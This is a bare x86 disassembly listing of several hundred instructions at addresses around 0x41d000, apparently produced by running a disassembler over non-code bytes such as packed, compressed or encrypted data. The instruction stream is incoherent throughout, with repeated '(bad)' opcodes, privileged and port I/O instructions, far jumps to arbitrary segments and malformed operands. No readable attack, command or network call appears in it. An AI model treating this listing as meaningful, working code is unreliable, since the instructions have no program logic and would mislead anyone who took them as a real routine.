  41cffc:	ins    DWORD PTR es:[edi],dx
  41cffd:	pop    ebp
  41cffe:	sbb    eax,DWORD PTR [edi-0x1a]
  41d001:	fiadd  DWORD PTR [ebp-0x4e920555]
  41d007:	out    dx,al
  41d008:	xor    edi,edi
  41d00a:	pop    ebp
  41d00b:	adc    BYTE PTR [edx+0xae69161],cl
  41d011:	push   ds
  41d012:	(bad)  
  41d013:	(bad)  
  41d014:	and    ch,dh
  41d016:	in     al,dx
  41d017:	cmp    ebx,ebx
  41d019:	test   eax,0x74300103
  41d01e:	inc    esp
  41d01f:	mov    edx,0x6483a4ae
  41d024:	cmp    eax,0x9ef020d3
  41d029:	fsub   QWORD PTR [edx+ebp*1-0x3b]
  41d02d:	ja     0x41cfd2
  41d02f:	shl    DWORD PTR [ebp+0x6c],0x6d
  41d033:	iret   
  41d034:	hlt    
  41d035:	dec    esp
  41d036:	sbb    BYTE PTR [eax],0x57
  41d039:	data16 jne 0x41d045
  41d03c:	jg     0x41d05b
  41d03e:	adc    al,0xac
  41d040:	mov    dl,0x20
  41d042:	dec    ecx
  41d043:	jns    0x41d002
  41d045:	push   esi
  41d046:	fwait
  41d047:	arpl   WORD PTR [eax-0x9],cx
  41d04a:	js     0x41d05b
  41d04c:	add    BYTE PTR [esi-0x7b],cl
  41d04f:	jae    0x41d083
  41d051:	scas   eax,DWORD PTR es:[edi]
  41d052:	scas   al,BYTE PTR es:[edi]
  41d053:	test   al,0xf7
  41d055:	pusha  
  41d056:	xchg   esp,eax
  41d057:	shl    DWORD PTR ss:[edx+0x4f0edc76],cl
  41d05e:	adc    eax,DWORD PTR [ecx+0x4f]
  41d061:	mov    gs,WORD PTR [eax]
  41d063:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d064:	inc    ebx
  41d065:	cmp    edx,DWORD PTR ds:0x8c563720
  41d06b:	pop    esi
  41d06c:	sub    dl,dh
  41d06e:	repnz icebp 
  41d070:	inc    ebx
  41d071:	and    al,0xfc
  41d073:	test   BYTE PTR [edx-0xb2efb9a],dl
  41d079:	sbb    al,BYTE PTR [ebp-0x65]
  41d07c:	sub    eax,0x922304a1
  41d081:	pusha  
  41d082:	mov    dh,0x92
  41d084:	add    edx,edx
  41d086:	cwde   
  41d087:	jae    0x41d101
  41d089:	push   edx
  41d08a:	js     0x41d06b
  41d08c:	xchg   ebx,eax
  41d08d:	fnsave [edx]
  41d08f:	jle    0x41d084
  41d091:	jo     0x41d091
  41d093:	push   es
  41d094:	jnp    0x41d0f8
  41d096:	mov    ebp,0x4e802786
  41d09b:	sbb    BYTE PTR [esp+eax*4-0x4e],0x65
  41d0a0:	outs   dx,BYTE PTR ds:[esi]
  41d0a1:	ret    
  41d0a2:	jbe    0x41d05b
  41d0a4:	mov    ch,0xbc
  41d0a6:	das    
  41d0a7:	fsubr  QWORD PTR [ecx-0x3e9210ad]
  41d0ad:	push   esi
  41d0ae:	xchg   edi,eax
  41d0af:	push   esi
  41d0b0:	ins    DWORD PTR es:[edi],dx
  41d0b1:	and    eax,0x75ac600c
  41d0b6:	xchg   edx,eax
  41d0b7:	xor    eax,0x60a20e8a
  41d0bc:	mov    edx,0x9456c4bb
  41d0c1:	mov    ebp,0x211f9050
  41d0c6:	mov    eax,ds:0xa5e56ac3
  41d0cb:	xchg   BYTE PTR [edx],bl
  41d0cd:	test   ax,0x4585
  41d0d1:	mov    edi,DWORD PTR [esp+ecx*1]
  41d0d4:	int3   
  41d0d5:	dec    esp
  41d0d6:	sbb    eax,0x1c8c142
  41d0db:	gs dec esp
  41d0dd:	xlat   BYTE PTR ds:[ebx]
  41d0de:	pop    esi
  41d0df:	repnz jecxz 0x41d152
  41d0e2:	xchg   edx,eax
  41d0e3:	rol    bl,0x48
  41d0e6:	test   ecx,esi
  41d0e8:	popa   
  41d0e9:	test   al,0x48
  41d0eb:	outs   dx,DWORD PTR ds:[esi]
  41d0ec:	ror    DWORD PTR [edx+0x4a56e556],1
  41d0f2:	dec    edx
  41d0f3:	idiv   dh
  41d0f5:	jmp    0x41d13c
  41d0f7:	xor    dh,ch
  41d0f9:	mov    esi,0x843d1229
  41d0fe:	add    BYTE PTR [ebx],dh
  41d100:	arpl   WORD PTR [ebp-0x631104ec],si
  41d106:	adc    dl,BYTE PTR [esi+0x24ea57b2]
  41d10c:	jecxz  0x41d17b
  41d10e:	bound  edi,QWORD PTR [ebx+edi*8-0x7c]
  41d112:	shr    DWORD PTR [edx],cl
  41d114:	out    0xe7,eax
  41d116:	scas   al,BYTE PTR es:[edi]
  41d117:	nop
  41d118:	and    BYTE PTR [edi-0x50c66050],0x8
  41d11f:	shr    DWORD PTR [edi+0x26],0xd1
  41d123:	dec    esi
  41d124:	scas   al,BYTE PTR es:[edi]
  41d125:	cwde   
  41d126:	push   ebp
  41d127:	outs   dx,BYTE PTR ds:[esi]
  41d128:	nop
  41d129:	add    al,0xd8
  41d12b:	lock xor DWORD PTR [eax+edi*2-0x2e3973af],eax
  41d133:	enter  0x9495,0x53
  41d137:	push   es
  41d138:	push   cs
  41d139:	outs   dx,BYTE PTR ds:[esi]
  41d13a:	push   ebp
  41d13b:	and    DWORD PTR [eax+edi*4-0x8],esi
  41d13f:	call   0xe50e:0x39562867
  41d146:	data16 icebp 
  41d148:	repnz ins BYTE PTR es:[edi],dx
  41d14a:	bound  ecx,QWORD PTR [edx+0x459f361c]
  41d150:	mov    al,0x7d
  41d152:	ja     0x41d193
  41d154:	aas    
  41d155:	test   BYTE PTR [edi-0x4cd2685f],bl
  41d15b:	dec    edi
  41d15c:	into   
  41d15d:	retf   0xdf03
  41d160:	sbb    esi,DWORD PTR [ebp-0x37]
  41d163:	mov    edx,0xdbeb1aff
  41d168:	out    dx,al
  41d169:	cli    
  41d16a:	dec    esi
  41d16b:	jnp    0x41d14f
  41d16d:	addr16 push ecx
  41d16f:	adc    bl,dh
  41d171:	pop    ebp
  41d172:	dec    esp
  41d173:	stc    
  41d174:	and    al,0x6c
  41d176:	sub    bl,BYTE PTR [edi]
  41d178:	stos   DWORD PTR es:[edi],eax
  41d179:	push   ds
  41d17a:	mov    ah,0x6e
  41d17c:	scas   eax,DWORD PTR es:[edi]
  41d17d:	or     BYTE PTR [edx+esi*4+0x3e83216f],ah
  41d184:	sub    BYTE PTR [eax],bh
  41d186:	es pop eax
  41d188:	(bad)  
  41d189:	pop    esi
  41d18a:	mov    bh,0x6a
  41d18c:	and    eax,0xb2b3dd56
  41d191:	ins    BYTE PTR es:[edi],dx
  41d192:	pop    ds
  41d193:	lods   al,BYTE PTR ds:[esi]
  41d194:	(bad)  
  41d195:	adc    ch,BYTE PTR [edx-0x6f]
  41d198:	retf   
  41d199:	mov    cl,0x4
  41d19b:	test   DWORD PTR [edx],ecx
  41d19d:	or     DWORD PTR [edi+ebx*8],esp
  41d1a0:	lea    edi,[esi+eax*4+0x8]
  41d1a4:	into   
  41d1a5:	sbb    DWORD PTR [edi+0x1f],esi
  41d1a8:	adc    al,0x53
  41d1aa:	mov    eax,DWORD PTR [edx+0x4ed2a65c]
  41d1b0:	mov    eax,ds:0x48ca076f
  41d1b5:	push   esi
  41d1b6:	mov    dl,0x36
  41d1b8:	movd   mm2,ebx
  41d1bb:	pop    edi
  41d1bc:	dec    ebp
  41d1bd:	clc    
  41d1be:	je     0x41d197
  41d1c0:	jge    0x41d1f7
  41d1c2:	mov    ecx,0x3de4a153
  41d1c7:	dec    edx
  41d1c8:	cmp    esp,DWORD PTR [ebx-0xa]
  41d1cb:	jb     0x41d194
  41d1cd:	call   0x41fb:0xed6be16f
  41d1d4:	leave  
  41d1d5:	iret   
  41d1d6:	ss push 0x64
  41d1d9:	loop   0x41d1da
  41d1db:	fdiv   st,st(6)
  41d1dd:	les    eax,FWORD PTR [edx+edx*8+0x3e]
  41d1e1:	inc    BYTE PTR [esi-0x12]
  41d1e4:	and    eax,0xa2aadb6
  41d1e9:	pushf  
  41d1ea:	pop    edi
  41d1eb:	mov    ebx,0x1a4fe91c
  41d1f0:	std    
  41d1f1:	mov    cl,0x30
  41d1f3:	pop    esi
  41d1f4:	popa   
  41d1f5:	push   ds
  41d1f6:	nop
  41d1f7:	lock loope 0x41d1c1
  41d1fa:	out    0xa0,eax
  41d1fc:	jp     0x41d1a1
  41d1fe:	jmp    0x41d1ab
  41d200:	cwde   
  41d201:	mov    esi,0x1a9140fe
  41d206:	xchg   edi,eax
  41d207:	gs sub esp,ecx
  41d20a:	sti    
  41d20b:	adc    ch,BYTE PTR [edx-0x7a786a08]
  41d211:	lods   al,BYTE PTR ds:[esi]
  41d212:	pop    ebp
  41d213:	jb     0x41d1ca
  41d215:	add    DWORD PTR [edx-0x2b1374e0],ecx
  41d21b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d21c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d21d:	pop    esp
  41d21e:	ficomp DWORD PTR [esi+0x702fba19]
  41d224:	mov    esi,0x1e27f81f
  41d229:	fwait
  41d22a:	mov    ?,WORD PTR [ebx+eiz*1+0x34]
  41d22e:	and    ch,0xb8
  41d231:	add    eax,0xf2408ba
  41d236:	push   ecx
  41d237:	jge    0x41d279
  41d239:	xchg   edx,eax
  41d23a:	cmc    
  41d23b:	call   0xf69c9616
  41d240:	arpl   WORD PTR [ebp+0x13],ax
  41d243:	in     al,0x98
  41d245:	in     eax,dx
  41d246:	icebp  
  41d247:	add    al,0x28
  41d249:	je     0x41d230
  41d24b:	div    DWORD PTR [eax+0x5f]
  41d24e:	and    al,0x29
  41d250:	int    0xbb
  41d252:	push   ebx
  41d253:	sahf   
  41d254:	pop    esp
  41d255:	enter  0x6da1,0x32
  41d259:	ss mov bl,0x33
  41d25c:	sbb    ch,BYTE PTR [eax]
  41d25e:	mov    esi,0x5b80db97
  41d263:	ret    
  41d264:	aas    
  41d265:	dec    esp
  41d266:	adc    al,0x46
  41d268:	shr    edi,1
  41d26a:	lods   eax,DWORD PTR ds:[esi]
  41d26b:	add    eax,0x4d23e71c
  41d270:	sbb    al,0x1
  41d272:	lea    edi,[eax+0x1485bf25]
  41d278:	xor    al,0x48
  41d27a:	pop    ss
  41d27b:	std    
  41d27c:	repz jg 0x41d28d
  41d27f:	adc    al,0x53
  41d281:	popa   
  41d282:	out    0xf2,al
  41d284:	pop    ebp
  41d285:	lods   al,BYTE PTR ds:[esi]
  41d286:	es push 0x5b
  41d289:	push   edx
  41d28a:	cmp    DWORD PTR [edi],ecx
  41d28c:	test   eax,0xe3891827
  41d291:	or     BYTE PTR [ebx],bh
  41d293:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d294:	hlt    
  41d295:	or     eax,0x900c26e3
  41d29a:	inc    edi
  41d29b:	jmp    0x13d9:0x9fb16bb8
  41d2a2:	(bad)  
  41d2a3:	icebp  
  41d2a4:	sbb    dh,bh
  41d2a6:	jmp    0x18a0:0x1d089371
  41d2ad:	aas    
  41d2ae:	adc    eax,0xe1d4b2b8
  41d2b3:	mov    ebx,0x27059392
  41d2b8:	loope  0x41d27e
  41d2ba:	mov    eax,ds:0x69bec32e
  41d2bf:	ret    
  41d2c0:	aad    0xde
  41d2c2:	shl    DWORD PTR [ebp-0x4c7e1bfd],1
  41d2c8:	xor    esp,DWORD PTR [esi+0x9]
  41d2cb:	and    esp,DWORD PTR [eax]
  41d2cd:	inc    esp
  41d2ce:	fisttp QWORD PTR [ebx+0x2cb7c945]
  41d2d4:	retf   
  41d2d5:	jmp    0xfb48:0xd6f8b575
  41d2dc:	jae    0x41d2c5
  41d2de:	dec    eax
  41d2df:	inc    edx
  41d2e0:	dec    ebx
  41d2e1:	in     eax,dx
  41d2e2:	inc    esp
  41d2e3:	ja     0x41d313
  41d2e5:	inc    ebx
  41d2e6:	inc    ebx
  41d2e7:	inc    eax
  41d2e8:	xor    BYTE PTR fs:[ebx-0x44],bh
  41d2ec:	cmp    DWORD PTR [esi],eax
  41d2ee:	push   cs
  41d2ef:	idiv   DWORD PTR [ebx]
  41d2f1:	mov    bl,0xed
  41d2f3:	pop    ecx
  41d2f4:	shr    BYTE PTR [ebx+0x54],cl
  41d2f7:	mov    ah,0x67
  41d2f9:	out    dx,eax
  41d2fa:	leave  
  41d2fb:	push   esi
  41d2fc:	test   bl,al
  41d2fe:	mov    ecx,0x77d0c963
  41d303:	push   ebp
  41d304:	shl    DWORD PTR [ecx],1
  41d306:	pop    ebp
  41d307:	into   
  41d308:	scas   al,BYTE PTR es:[edi]
  41d309:	cwde   
  41d30a:	ror    dl,1
  41d30c:	inc    ecx
  41d30d:	jae    0x41d352
  41d30f:	push   esi
  41d310:	and    ah,ah
  41d312:	out    0xc1,eax
  41d314:	xor    bh,BYTE PTR [ebx]
  41d316:	xchg   edx,eax
  41d317:	int    0xf9
  41d319:	and    al,0xac
  41d31b:	rcl    BYTE PTR [esi+0x10e6d942],cl
  41d321:	test   BYTE PTR [eax+eax*8+0x35],dh
  41d325:	call   0x92421453
  41d32a:	ds cwde 
  41d32c:	jnp    0x41d378
  41d32e:	or     bl,bl
  41d330:	push   edx
  41d331:	or     bl,BYTE PTR [eax]
  41d333:	or     edx,0x73af9752
  41d339:	outs   dx,DWORD PTR ds:[esi]
  41d33a:	test   ebp,eax
  41d33c:	jge    0x41d2d4
  41d33e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d33f:	xor    esi,esp
  41d341:	mov    al,ds:0x780d425e
  41d346:	xchg   esp,eax
  41d347:	les    esp,FWORD PTR [edx-0x25ca7ba3]
  41d34d:	test   ebx,esp
  41d34f:	push   ebp
  41d350:	cmc    
  41d351:	in     al,0x6e
  41d353:	or     eax,0x74698ed6
  41d358:	add    DWORD PTR [edi-0x59],edi
  41d35b:	adc    DWORD PTR [edi],ebx
  41d35d:	add    ebp,ebx
  41d35f:	push   es
  41d360:	lea    edi,[ebp+0x4]
  41d363:	ficom  WORD PTR [esp+ecx*2-0x40488e94]
  41d36a:	cld    
  41d36b:	push   cs
  41d36c:	call   DWORD PTR [edx-0x68d53655]
  41d372:	in     al,0x92
  41d374:	fidivr DWORD PTR [eax+0x69]
  41d377:	xchg   ecx,eax
  41d378:	in     al,0x4
  41d37a:	bound  esp,QWORD PTR [eax+0x3be91d71]
  41d380:	jmp    ebp
  41d382:	sbb    DWORD PTR [ecx+0x47774555],0xfffffffb
  41d389:	or     DWORD PTR [ebp+0x36],edi
  41d38c:	fsub   DWORD PTR [ebx+0x963d786]
  41d392:	jg     0x41d402
  41d394:	inc    eax
  41d395:	add    ch,BYTE PTR [esp+ebx*2-0x806193e]
  41d39c:	and    esi,DWORD PTR [eax]
  41d39e:	inc    edi
  41d39f:	popa   
  41d3a0:	mov    ecx,0xa90fcb78
  41d3a5:	iret   
  41d3a6:	stc    
  41d3a7:	xchg   dl,ch
  41d3a9:	jp     0x41d377
  41d3ab:	dec    esi
  41d3ac:	sbb    ah,bh
  41d3ae:	into   
  41d3af:	daa    
  41d3b0:	cmp    bh,BYTE PTR [ebx+0x7f7a5300]
  41d3b6:	inc    edi
  41d3b7:	cmp    al,0x90
  41d3b9:	cld    
  41d3ba:	add    DWORD PTR [esi-0x71c03995],ebx
  41d3c0:	lods   al,BYTE PTR ds:[esi]
  41d3c1:	xchg   edi,eax
  41d3c2:	adc    BYTE PTR [ebx*2-0x176d2076],0xf6
  41d3ca:	xor    BYTE PTR [ebp-0x1d5a56e5],dh
  41d3d0:	sub    bh,BYTE PTR [edx+0x33]
  41d3d3:	sahf   
  41d3d4:	repz or al,0x1c
  41d3d7:	inc    eax
  41d3d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d3d9:	lds    ebx,FWORD PTR [edx+0x19]
  41d3dc:	push   ecx
  41d3dd:	mov    dh,0xbe
  41d3df:	test   al,0x64
  41d3e1:	scas   al,BYTE PTR es:[edi]
  41d3e2:	daa    
  41d3e3:	sbb    esi,ebp
  41d3e5:	push   eax
  41d3e6:	ret    
  41d3e7:	je     0x41d446
  41d3e9:	bound  ebp,QWORD PTR [ebp+0x333d2d55]
  41d3ef:	xchg   edx,eax
  41d3f0:	inc    edx
  41d3f1:	dec    edx
  41d3f2:	xchg   ecx,eax
  41d3f3:	jmp    0x41d410
  41d3f5:	mov    ch,0xe0
  41d3f7:	lds    ebx,FWORD PTR [eax+0x6ec2cde5]
  41d3fd:	je     0x41d3d5
  41d3ff:	sti    
  41d400:	adc    eax,0xa2f0988c
  41d405:	outs   dx,DWORD PTR ds:[esi]
  41d406:	add    DWORD PTR [edx-0x69],0xae1cf201
  41d40d:	arpl   WORD PTR [ebx-0x19],si
  41d410:	aaa    
  41d411:	(bad)  
  41d412:	ret    
  41d413:	push   ebp
  41d414:	scas   eax,DWORD PTR es:[edi]
  41d415:	out    0x4e,al
  41d417:	imul   ebx,DWORD PTR [ecx+0x39],0xffffffa1
  41d41b:	mov    bh,0xe5
  41d41d:	in     al,0x8c
  41d41f:	mul    DWORD PTR [eax+0x40fe8b43]
  41d425:	in     al,0xd7
  41d427:	add    dl,ch
  41d429:	rcr    bl,cl
  41d42b:	adc    ebx,eax
  41d42d:	push   ebx
  41d42e:	sub    eax,DWORD PTR [edi]
  41d430:	popf   
  41d431:	pop    es
  41d432:	add    BYTE PTR [esi],bl
  41d434:	inc    ecx
  41d435:	jb     0x41d4b0
  41d437:	jg     0x41d4a3
  41d439:	into   
  41d43a:	cwde   
  41d43b:	iret   
  41d43c:	or     al,0xcf
  41d43e:	mov    edx,DWORD PTR [ebp+eiz*2-0x54]
  41d442:	mov    ds:0xec6c14bd,eax
  41d447:	lock sbb al,0x58
  41d44a:	shr    ch,0x98
  41d44d:	cmp    cl,BYTE PTR [edx-0x7b]
  41d450:	(bad)  
  41d451:	cdq    
  41d452:	and    al,0xc6
  41d454:	cmp    ah,BYTE PTR [edi]
  41d456:	enter  0x2cb3,0x45
  41d45a:	ja     0x41d4ce
  41d45c:	mov    BYTE PTR [ebx+0x7faf6179],cl
  41d462:	out    0x7,al
  41d464:	mov    eax,DWORD PTR [esi-0x19]
  41d467:	into   
  41d468:	mov    bh,0x67
  41d46a:	cmp    DWORD PTR [edx],eax
  41d46c:	leave  
  41d46d:	rcl    DWORD PTR [esi],1
  41d46f:	outs   dx,BYTE PTR ds:[esi]
  41d470:	sahf   
  41d471:	xchg   ebx,eax
  41d472:	dec    esp
  41d473:	fcmovne st,st(3)
  41d475:	daa    
  41d476:	test   DWORD PTR [esi+0x12],ebp
  41d479:	test   DWORD PTR [ebx+eax*2+0x12],ecx
  41d47d:	out    0xb3,eax
  41d47f:	mov    eax,0x950ccf
  41d484:	rcr    DWORD PTR [edx-0x57],1
  41d487:	sub    BYTE PTR [ebx+esi*8-0x744343b0],dh
  41d48e:	stos   DWORD PTR es:[edi],eax
  41d48f:	adc    edx,DWORD PTR [ecx]
  41d491:	mov    cl,0x4d
  41d493:	mov    esp,0xd00729d2
  41d498:	xchg   BYTE PTR [ecx-0x3a],bh
  41d49b:	pop    esi
  41d49c:	mov    eax,0xdc61f428
  41d4a1:	es mov dh,0xc4
  41d4a4:	data16 cmp BYTE PTR [esi+0x2e69b462],0x70
  41d4ac:	jl     0x41d4a1
  41d4ae:	mov    esi,0x1dafdf15
  41d4b3:	push   edi
  41d4b4:	xlat   BYTE PTR ds:[ebx]
  41d4b5:	push   eax
  41d4b6:	or     eax,ebx
  41d4b8:	mov    al,0x6a
  41d4ba:	(bad)  [eax+0x6e]
  41d4bd:	in     eax,0x8e
  41d4bf:	or     BYTE PTR [esi+0x33ef5656],dh
  41d4c5:	repnz mov ch,0xbc
  41d4c8:	test   al,0x58
  41d4ca:	cmp    al,cl
  41d4cc:	mov    eax,0xdb450298
  41d4d1:	inc    edx
  41d4d2:	popa   
  41d4d3:	mov    bh,0xc3
  41d4d5:	pusha  
  41d4d6:	add    DWORD PTR [eax+ebx*1-0x3b],edx
  41d4da:	jno    0x41d533
  41d4dc:	jo     0x41d472
  41d4de:	lock mov bl,0xa4
  41d4e1:	mov    ch,0xce
  41d4e3:	mov    ds:0xa5efe104,eax
  41d4e8:	mov    DWORD PTR [edi+0x14f55a38],esi
  41d4ee:	in     eax,0x37
  41d4f0:	pop    ebp
  41d4f1:	cli    
  41d4f2:	(bad)  
  41d4f3:	out    0x46,al
  41d4f5:	popa   
  41d4f6:	(bad)  
  41d4f7:	or     eax,0x30a9dd0f
  41d4fc:	stos   DWORD PTR es:[edi],eax
  41d4fd:	retf   0xbe47
  41d500:	xchg   esp,eax
  41d501:	mov    ebp,0x3ee7b9d3
  41d506:	mov    esi,0x1c7ac106
  41d50b:	add    al,0x35
  41d50d:	dec    edi
  41d50e:	add    ch,al
  41d510:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d511:	xor    al,0x4f
  41d513:	hlt    
  41d514:	out    dx,eax
  41d515:	xor    cl,BYTE PTR [eax]
  41d517:	adc    al,0x5e
  41d51a:	jbe    0x41d56c
  41d51c:	fbld   TBYTE PTR [ebp+0x30]
  41d51f:	dec    esp
  41d520:	mov    al,BYTE PTR [ebx]
  41d522:	push   ecx
  41d523:	bound  edi,QWORD PTR [edx+eiz*2+0x24]
  41d527:	mov    ch,0x5f
  41d529:	add    edx,ecx
  41d52b:	xor    DWORD PTR [esi-0x650cdeb1],0x11e94925
  41d535:	ss jecxz 0x41d553
  41d538:	cmp    al,0x96
  41d53a:	mov    ah,0xf2
  41d53c:	fisub  DWORD PTR [esi]
  41d53f:	pop    ecx
  41d540:	pusha  
  41d541:	jne    0x41d557
  41d543:	(bad)
  41d546:	sbb    al,al
  41d548:	in     eax,dx
  41d549:	call   0xc8dc:0x6c35740a
  41d550:	fistp  DWORD PTR [esi-0x7a]
  41d553:	int3   
  41d554:	adc    dh,BYTE PTR [eax]
  41d556:	push   ds
  41d557:	arpl   WORD PTR [edx+edx*1+0x9],si
  41d55b:	and    cl,BYTE PTR ds:[esi+edi*8]
  41d55f:	xchg   edx,eax
  41d560:	js     0x41d503
  41d562:	mov    dl,0xa2
  41d564:	and    BYTE PTR [ebx-0x26d3b852],ah
  41d56a:	test   DWORD PTR [ecx+eiz*1],edi
  41d56d:	jmp    0x518a:0xe063e670
  41d574:	addr16 das 
  41d576:	pushf  
  41d577:	or     BYTE PTR [esi+0x34c0e905],cl
  41d57d:	call   DWORD PTR [esi+0x68]
  41d580:	out    dx,eax
  41d581:	stos   DWORD PTR es:[edi],eax
  41d582:	cli    
  41d583:	and    eax,0x1b13cd5f
  41d588:	dec    ecx
  41d589:	nop
  41d58a:	ins    DWORD PTR es:[edi],dx
  41d58b:	sub    eax,0xbaa2328a
  41d590:	mov    cl,0x52
  41d592:	ja     0x41d51a
  41d594:	test   BYTE PTR [ebx],cl
  41d596:	mov    bh,0x1d
  41d598:	mov    WORD PTR [esi+0x670f82f1],gs
  41d59e:	mov    edx,0x53e8e21c
  41d5a3:	bound  esi,QWORD PTR [ecx+0x60]
  41d5a6:	xor    eax,0x83870598
  41d5ab:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d5ac:	fist   DWORD PTR [edi+esi*2-0x8]
  41d5b0:	fcom   QWORD PTR [esi-0x6e23d767]
  41d5b6:	aaa    
  41d5b7:	mov    ah,0xa0
  41d5b9:	xor    al,BYTE PTR ds:[ecx]
  41d5bc:	jne    0x41d5da
  41d5be:	fs push 0xffffff97
  41d5c1:	std    
  41d5c2:	call   0x511f0df6
  41d5c7:	popa   
  41d5c8:	or     eax,0x15bff4c5
  41d5cd:	into   
  41d5ce:	js     0x41d5f5
  41d5d0:	stos   DWORD PTR es:[edi],eax
  41d5d1:	lea    eax,[eax-0x58021f0d]
  41d5d7:	pop    esp
  41d5d8:	push   edx
  41d5d9:	fisubr WORD PTR [esi-0x2f]
  41d5dc:	push   ebp
  41d5dd:	or     al,0xc8
  41d5df:	inc    edx
  41d5e0:	add    eax,0x3e28ecaa
  41d5e5:	pop    ds
  41d5e6:	(bad)  
  41d5e7:	sbb    ebp,DWORD PTR [ebp+0x7a]
  41d5ea:	mov    ch,0x3d
  41d5ec:	ret    0x481c
  41d5ef:	jge    0x41d5f2
  41d5f1:	sbb    BYTE PTR [edx],al
  41d5f3:	sub    ecx,DWORD PTR [eax]
  41d5f5:	jns    0x41d661
  41d5f7:	out    dx,al
  41d5f8:	inc    ebx
  41d5f9:	dec    edi
  41d5fa:	(bad)  
  41d5fb:	jne    0x41d63d
  41d5fd:	shl    BYTE PTR [ebp+ebp*1-0x4d],0x8d
  41d602:	cdq    
  41d603:	jl     0x41d585
  41d605:	cmp    BYTE PTR ds:0x6f373a82,ah
  41d60b:	stos   BYTE PTR es:[edi],al
  41d60c:	add    ecx,DWORD PTR [ebp+0x1339538d]
  41d612:	es xor al,0x2d
  41d615:	dec    edx
  41d616:	xor    DWORD PTR [esi-0x3bf3cd77],esi
  41d61c:	mov    ds,WORD PTR [eax-0xc27980e]
  41d622:	lahf   
  41d623:	push   es
  41d624:	pop    ecx
  41d625:	ror    DWORD PTR [edx+0x768add38],cl
  41d62b:	cdq    
  41d62c:	inc    ebx
  41d62d:	or     bh,BYTE PTR [edi-0x7a]
  41d630:	xor    DWORD PTR [esi],ecx
  41d632:	stos   DWORD PTR es:[edi],eax
  41d633:	xor    BYTE PTR [esi+0x350d5cbf],cl
  41d639:	adc    eax,0x373da18e
  41d63e:	or     BYTE PTR [eax],bh
  41d640:	mov    ds:0xbc94d1fa,al
  41d645:	push   esp
  41d646:	ficom  WORD PTR [ebx+0x4f]
  41d649:	lods   eax,DWORD PTR ds:[esi]
  41d64a:	mov    ah,0x4
  41d64c:	mov    ds:0x960a5f60,al
  41d651:	or     edi,DWORD PTR ds:0x6311e6f3
  41d657:	mov    bl,0x1a
  41d659:	mov    ebx,0xb326891d
  41d65e:	jmp    0x7d8:0xa5584483
  41d665:	dec    esi
  41d666:	mov    ebp,DWORD PTR [ebx-0x56]
  41d669:	bound  edx,QWORD PTR [eax]
  41d66b:	mov    esi,0xefa6f0e
  41d670:	call   0x339:0x28f5ba26
  41d677:	frstor [ecx+ecx*8]
  41d67a:	inc    ecx
  41d67b:	test   al,0x6b
  41d67d:	mov    eax,0xadcaf98c
  41d682:	xchg   esp,eax
  41d683:	inc    ecx
  41d684:	pusha  
  41d685:	pusha  
  41d686:	adc    al,0x90
  41d688:	sbb    eax,0x37f1e083
  41d68d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d68e:	aas    
  41d68f:	inc    edi
  41d690:	(bad)  
  41d691:	jp     0x41d679
  41d693:	push   ss
  41d694:	mov    DWORD PTR [eax+0x4a],0xe8452443
  41d69b:	inc    esi
  41d69c:	mov    ?,WORD PTR [esi+0x4c]
  41d69f:	pop    esi
  41d6a0:	mov    esp,0x995bcba9
  41d6a5:	jno    0x41d71b
  41d6a7:	retf   0xc9f6
  41d6aa:	repz mov ch,0x9
  41d6ae:	sbb    BYTE PTR [edi-0x2e],0x87
  41d6b2:	push   ebx
  41d6b3:	(bad)  
  41d6b4:	or     BYTE PTR [edx+eiz*4+0x59],al
  41d6b8:	ins    DWORD PTR es:[edi],dx
  41d6b9:	sti    
  41d6ba:	stos   BYTE PTR es:[edi],al
  41d6bb:	push   edx
  41d6bc:	mov    dl,0x43
  41d6be:	sub    esp,DWORD PTR [esi-0x6d]
  41d6c1:	ror    DWORD PTR [esi-0x149e83a9],1
  41d6c7:	mov    ebp,DWORD PTR [esp+0x2198a3a4]
  41d6ce:	rol    BYTE PTR [esi+eiz*8-0x26],cl
  41d6d2:	call   0x9e60:0xf7750e5b
  41d6d9:	imul   esp,DWORD PTR [edi-0x79c4ec8d],0xdc8aa8c0
  41d6e3:	lods   eax,DWORD PTR ds:[esi]
  41d6e4:	dec    ecx
  41d6e5:	call   DWORD PTR [ebx+0x5906d0c8]
  41d6eb:	fdivr  QWORD PTR [ebx+0x7e]
  41d6ee:	push   ds
  41d6ef:	pop    esi
  41d6f0:	jecxz  0x41d69a
  41d6f2:	sub    eax,0x4c0ca8a6
  41d6f7:	mov    ch,BYTE PTR [ebx+0x197bd3dd]
  41d6fd:	fdiv   DWORD PTR [eax]
  41d6ff:	mov    ecx,0x2e6a08df
  41d704:	bound  ebp,QWORD PTR [eax]
  41d706:	ss dec edx
  41d708:	mov    ecx,0xfa34a964
  41d70d:	fisubr DWORD PTR [ebx+0x6da5d6c6]
  41d713:	xor    ah,BYTE PTR [edx-0x6efc6292]
  41d719:	ds clc 
  41d71b:	and    eax,0x7ad42c15
  41d720:	test   DWORD PTR [ebp-0x1221e4b8],esi
  41d726:	cld    
  41d727:	arpl   WORD PTR [esi+0x2894ee2b],dx
  41d72d:	sahf   
  41d72e:	sub    ebp,DWORD PTR [ecx+0x64]
  41d731:	xchg   esi,eax
  41d732:	add    DWORD PTR [edx],edi
  41d734:	cmp    eax,0x88c72ea6
  41d739:	fild   WORD PTR [edx+0x6]
  41d73c:	dec    eax
  41d73d:	out    dx,al
  41d73e:	out    dx,al
  41d73f:	sub    al,BYTE PTR [edi-0x5e1af38a]
  41d745:	sub    al,0x2c
  41d747:	mov    ss,WORD PTR [esp+edi*2-0x4d040150]
  41d74e:	cmp    ecx,DWORD PTR [edi-0x1ce1fda4]
  41d754:	sbb    dh,BYTE PTR [ecx]
  41d756:	pop    esi
  41d757:	adc    dl,BYTE PTR [edi]
  41d759:	mov    gs,WORD PTR [ecx+ebx*1+0x52]
  41d75d:	and    eax,esp
  41d75f:	mov    esi,0xda45bd
  41d764:	xlat   BYTE PTR ds:[ebx]
  41d765:	cmp    bh,BYTE PTR [edx]
  41d767:	(bad)  
  41d768:	cli    
  41d769:	sbb    esp,DWORD PTR ds:0x2539d7cf
  41d76f:	(bad)  
